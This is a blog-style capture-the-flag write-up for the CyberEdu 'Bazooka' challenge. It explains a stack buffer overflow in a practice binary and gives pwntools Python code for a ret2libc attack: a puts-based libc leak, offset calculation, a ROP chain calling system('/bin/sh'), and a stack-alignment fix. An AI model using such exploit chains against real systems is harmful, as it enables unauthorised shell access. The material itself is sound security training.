+++
date = '2025-12-02'
draft = false
title = 'CyberEdu Bazooka Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Ret2libc"]
+++

## Challenge overview


We have a problem on the station on Mars, we suspect we would be attacked by some hackers so we put a little protection against them. 

**[The challenge](https://app.cyber-edu.co/challenges/ae81c600-347c-11eb-a2b9-a539e3b969ab?tenant=cyberedu)** was proposed by BIT SENTINEL.

![challenge-screenshot](pic1.png#center)

At first glance, the **pwn_bazooka_bazooka** looks like a 64-bit executable, and I didn't immediately notice any obvious buffer overflows or format strings. It takes a *message* input and a *junk* input. So let's take a look at the binary.

![challenge-screenshot](pic2.png#center)

We can see a couple of functions inside the binary, `main`, `helper`, `l00p`, `vuln` and `fake`. 

![challenge-screenshot](pic3.png#center)

Helper returns `savedregs`.

![challenge-screenshot](pic3.png#center)

This function returns `fake` and displays "Try harder" if our input isn't `"#!@{try_hard3r}"`, and otherwise returns `vuln`.

![challenge-screenshot](pic4.png#center)

The `fake` function takes "junk" input and returns to `l00p`.

![challenge-screenshot](pic5.png#center)

Finally, our `vuln` stores input in `v1` and outputs "Hacker alert".


---

## Identifying the vulnerabilities

About all of these functions (except `l00p`, because of that `strcmp` that redirects us) have a buffer overflow vulnerability - this makes me thing about popping a shell. So let's analyze the binary and see if we can find any `/bin/sh` in memory.

![challenge-screenshot](pic6.png#center)

Well, I look at that! The `libc` `/bin/sh`!

Using the buffer overflow in `vuln`, I made a `pop_rdi_ret + helper + p64(elf.plt['puts']` to see if there's anything interesting in `helper` but it didn't seem like it. 

![challenge-screenshot](pic7.png#center)

---

## The exploit

Since the program uses `ASLR`, we can't just know where `/bin/sh` and `system` are going to be. So we could try a `ret2libc`, and then calculating the offsets.

```python
p.sendline(b"A"*112 + b'\x90'*8 + 
            pop_rdi_ret + 
            p64(elf.got['puts']) + 
            p64(elf.plt['puts']) + 
            l00p)

p.recvline()

leak = p.recv(6)
leaked = u64( leak.ljust(8, b'\x00'))

print(f"leak: {hex(leaked)}")

puts_offset = 0x585a0
libc = leaked - puts_offset

print(f"libc: {hex(libc)}")
```

This gets us our `libc` address successfully! 

![challenge-screenshot](pic9.png#center)

Now all that's left to do is calculate the offsets to `/bin/sh` and `system`.

```python
binsh_offset = 0x17fea4
binsh = libc + binsh_offset

system_offset = 0x2b110
system = libc + system_offset

print(f"binsh: {hex(binsh)}")
print(f"system: {hex(system)}")

#l00p
p.recvuntil(b": ")
p.sendline(b"#!@{try_hard3r}")

#vuln
p.recvuntil(b": ")
#bufoverflow -> ret to l00p
p.sendline(b"A"*112 + 
           b'\x90'*8 +
           pop_rdi_ret + 
           p64(binsh) + 
           p64(system) + 
           l00p)
```

Everything seemed to be going alright, we entered the `system` function with the correct `/bin/sh` pointer, but we end up getting a SIGSEGV. Most likely, this is an alignment issue, so let's find a `ret` gadget to our payload. 

![challenge-screenshot](pic10.png#center)

We did it!!! All it took was adding the `ret` gadget like so:

```python
p.sendline(b"A"*112 + b'\x90'*8 + pop_rdi_ret + p64(binsh) + ret + p64(system) + l00p)
```

---

# Different libc versions

Now, the worst part - testing remotely.

![challenge-screenshot](pic11.png#center)

Unsurprising... This always happens. I tried moving the `ret` gadget around, but most probably our version of `glibc` is different from what they're using. How are we even supposed to figure it ourselves?

![challenge-screenshot](pic12.png#center)

Using `strings pwn_bazooka_bazooka | grep -i glibc`, I tried to take a look at what the binary contains, so we can try the known offsets for `2.27`, since it's the latest version included here.

Since the challenge came out in 2020, the very latest version it could have been is `2.31`. That helps narrow it down a little. 

And we can use **[blukat's symbols library](https://libc.blukat.me/d/libc6_2.27-3ubuntu1.4_amd64.symbols)** to find the `2.27` version offsets for `puts` (found as `IO_puts`), `bin_sh` and `system`.

![challenge-screenshot](pic13.png#center)

It worked, first try! I'm just glad we didn't have to go through 5 different libraries to solve this.



---


As always, the rest of the code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/bazooka.py)**.
